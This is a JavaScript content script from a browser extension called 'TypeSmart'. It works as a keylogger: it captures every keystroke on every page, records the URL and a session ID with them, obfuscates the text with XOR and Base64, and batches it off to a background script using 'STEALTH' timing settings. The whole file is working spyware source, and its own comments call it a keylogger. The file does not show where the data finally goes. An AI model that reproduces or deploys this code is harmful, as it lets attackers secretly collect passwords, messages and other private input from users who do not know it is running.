
/* global TSConstants, BrowserAPI */
// Globals are loaded by manifest (constants.js, apiCompat.js loaded first)
const { MSG_TYPES, STEALTH, OBFUSCATION } = window.TSConstants;
const API = window.BrowserAPI;
console.log(
  "[TypeSmart] Content script loaded  (API: " + API.info.apiType + ")",
);
// ============================================================================
// Variables + createEntry() function
// ============================================================================
let buffer = ""; // string that grows with every keystroke
let timer = null; // 3-second timer
let sessionId = Date.now().toString(); // unique session ID
function createEntry(keys) {
  return {
    url: window.location.href,
    timestamp: Date.now(), // Unix timestamp in milliseconds
    keys: keys,
    sessionId: sessionId,
    obfuscated: obfuscate(keys),
  };
}
// ============================================================================
// Obfuscation helper (XOR + Base64)
// ============================================================================
function obfuscate(plainText) {
  // Convert any Unicode characters (like our arrow symbols: ←, →) into a byte string
  // This prevents btoa() from crashing with InvalidCharacterError
  const safeString = unescape(encodeURIComponent(plainText));
  let result = "";
  for (let i = 0; i < safeString.length; i++) {
    const code = safeString.charCodeAt(i) ^ OBFUSCATION.XOR_KEY;
    result += String.fromCharCode(code);
  }
  return btoa(result); // Base64 encode
}
// ============================================================================
// Communication with background.js
// ============================================================================
function flushBuffer() {
  if (buffer.length === 0) return;
  const entry = createEntry(buffer);
  // Send to background script
  API.runtime
    .sendMessage({
      type: MSG_TYPES.LOG_KEYS,
      payload: JSON.stringify(entry),
    })
    .then((response) => {
      if (
        response &&
        (response.status === "logged" || response.success === true)
      ) {
        buffer = ""; // Clear buffer after successful flush
        clearTimeout(timer);
        timer = null;
      }
    })
    .catch((err) => {
      console.error("[TypeSmart] Failed to send keystrokes:", err);
    });
}
function resetTimer() {
  if (timer !== null) {
    clearTimeout(timer);
  }
  timer = setTimeout(() => {
    flushBuffer();
  }, STEALTH.DELAY_MS);
}
// ============================================================================
// Main keylogger: Capture all keystrokes
// ============================================================================
document.addEventListener("keydown", (e) => {
  let char = "";
  if (e.key === "Backspace") char = "[BKSP]";
  else if (e.key === "Enter" || e.key === "Return") char = "[ENTER]";
  else if (e.key === "Tab") char = "[TAB]";
  else if (e.key === "Shift") char = "[SHIFT]";
  else if (e.key === "Control") char = "[CTRL]";
  else if (e.key === "Alt") char = "[ALT]";
  else if (e.key === "ArrowLeft") char = "[←]";
  else if (e.key === "ArrowRight") char = "[→]";
  else if (e.key === "ArrowUp") char = "[↑]";
  else if (e.key === "ArrowDown") char = "[↓]";
  else if (e.key.length === 1) char = e.key; // normal printable char
  if (char === "") return; // ignore other keys (CapsLock, etc.)
  buffer += char;
  // Flush if batch size reached or minimum length exceeded
  if (
    buffer.length >= STEALTH.BATCH_SIZE ||
    buffer.length >= STEALTH.MIN_KEY_LENGTH
  ) {
    flushBuffer();
  } else {
    resetTimer();
  }
});
// Flush any remaining keystrokes before page unload
window.addEventListener("beforeunload", flushBuffer);
